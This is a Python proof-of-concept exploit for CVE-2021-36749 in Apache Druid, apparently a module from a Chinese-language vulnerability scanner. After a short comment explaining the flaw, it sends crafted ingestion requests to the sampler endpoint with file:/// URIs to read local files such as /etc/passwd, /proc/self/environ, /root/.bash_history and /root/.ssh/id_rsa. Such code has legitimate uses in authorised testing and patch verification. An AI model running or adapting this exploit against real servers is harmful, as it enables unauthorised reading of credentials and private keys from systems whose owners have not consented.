"""
CVE-2021-36749
源码来源：
https://github.com/dorkerdevil/CVE-2021-36749/blob/main/CVE-2021-36749.py
"""
import json

import requests

import main

# In the Druid ingestion system, the InputSource is used for reading data from a certain data source. However,
# the HTTP InputSource allows authenticated users to read data from other sources than intended, such as the local
# file system, with the privileges of the Druid server process. This is not an elevation of privilege when users
# access Druid directly, since Druid also provides the Local InputSource, which allows the same level of access. But
# it is problematic when users interact with Druid indirectly through an application that allows users to specify the
# HTTP InputSource, but not the Local InputSource. In this case, users could bypass the application-level restriction
# by passing a file URL to the HTTP InputSource. This issue was previously mentioned as being fixed in 0.21.0 as per
# CVE-2021-26920 but was not fixed in 0.21.0 or 0.21.1.

lists = [
    "/etc/passwd",
    "/etc/group",
    "/etc/hosts",
    "/etc/motd",
    "/etc/issue",
    "/etc/bashrc",
    "/etc/apache2/apache2.conf",
    "/etc/apache2/ports.conf",
    "/etc/apache2/sites-available/default",
    "/etc/httpd/conf/httpd.conf",
    "/etc/httpd/conf.d",
    "/etc/httpd/logs/access.log",
    "/etc/httpd/logs/access_log",
    "/etc/httpd/logs/error.log",
    "/etc/httpd/logs/error_log",
    "/etc/init.d/apache2",
    "/etc/mysql/my.cnf",
    "/etc/nginx.conf",
    "/opt/lampp/logs/access_log",
    "/opt/lampp/logs/error_log",
    "/opt/lamp/log/access_log",
    "/opt/lamp/logs/error_log",
    "/proc/self/environ",
    "/proc/version",
    "/proc/cmdline",
    "/proc/mounts",
    "/proc/config.gz",
    "/root/.bashrc",
    "/root/.bash_history",
    "/root/.ssh/authorized_keys",
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_rsa.keystore",
    "/root/.ssh/id_rsa.pub",
    "/root/.ssh/known_hosts",
]


def Apache_Druid_any_path(inurl, timeout=6,code='gbk'):
    poc_name = 'CVE-2021-36749'
    re = ''
    if inurl[-1] == '/':
        inurl = inurl[0:len(inurl) - 1]
    for list in lists:
        url = inurl + "/druid/indexer/v1/sampler?for=connect"
        headerss = {"Accept": "application/json, text/plain, */*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                    "Content-Type": "application/json;charset=UTF-8", "Origin": "http://130.59.118.184:8888",
                    "Referer": "http://130.59.118.184:8888/unified-console.html", "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        post_data = {"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index",
                                                                             "firehose": {"type": "http", "uris": [
                                                                                 " file:///" + list]}},
                                               "dataSchema": {"dataSource": "sample", "parser": {"type": "string",
                                                                                                 "parseSpec": {
                                                                                                     "format": "regex",
                                                                                                     "pattern": "(.*)",
                                                                                                     "columns": ["a"],
                                                                                                     "dimensionsSpec": {},
                                                                                                     "timestampSpec": {
                                                                                                         "column": "no_ such_ column",
                                                                                                         "missingValue": "2010-01-01T00:00:00Z"}}}}},
                     "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
        r = requests.post(url, headers=headerss, json=post_data, timeout=timeout, verify=False)
        r.encoding = code
        re = re + r.text
        if not 'Error 404 Not Found' in re and not 'Not Found' in re:
            if not '404' in re:
                main.print_green(f'{poc_name} ====> 存在漏洞 ====> {url}')
                return
            else:
                re = re + '失败'
        else:
            re = re + '失败'
    return re
